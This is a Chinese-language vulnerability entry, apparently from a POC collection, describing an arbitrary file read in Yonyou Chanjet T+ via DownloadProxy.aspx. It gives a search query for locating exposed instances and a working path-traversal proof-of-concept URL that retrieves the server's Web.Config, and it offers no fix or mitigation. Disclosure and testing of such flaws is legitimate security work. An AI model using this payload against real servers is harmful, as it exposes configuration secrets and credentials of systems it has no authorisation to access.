# 用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞

## 漏洞描述

用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 漏洞影响

<a-checkbox checked>用友 畅捷通T+</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="畅捷通-TPlus"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1662017510454-8bb328d0-35ee-42f9-a36a-625e95a5cfc2-20220903111940237.png)

验证POC

```php
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```

![img](../../../.vuepress/public/img/1662017739558-82948854-e961-4934-8ac2-c29e660277b2.png)